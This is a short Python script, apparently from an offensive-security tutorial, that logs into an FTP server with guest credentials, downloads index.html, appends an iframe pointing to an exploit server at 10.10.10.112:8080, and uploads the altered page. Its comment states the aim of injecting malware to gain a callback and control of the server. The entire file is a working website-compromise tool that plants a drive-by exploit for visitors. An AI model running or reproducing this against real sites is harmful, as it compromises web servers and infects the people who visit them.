import ftplib
# inject malware to get call back and take control of server
def injectPage(ftp, page, redirect):
    file = open(page + '.tmp', 'w')
    ftp.retrlines('RETR' + page, file.write)
    print '[+] Downloaded Page: ' + page
    file.write(redirect)
    file.close()
    print '[+] Injected malware iframe on: ' + page
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print '[+] Upload Injected Page: ' + page
host = '192.168.95.179'
userName = 'guest'
passWord = 'guest'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
redirect = '<iframe src='+'"http://10.10.10.112:8080/exploit"></iframe>'
injectPage(ftp, 'index.html', redirect)
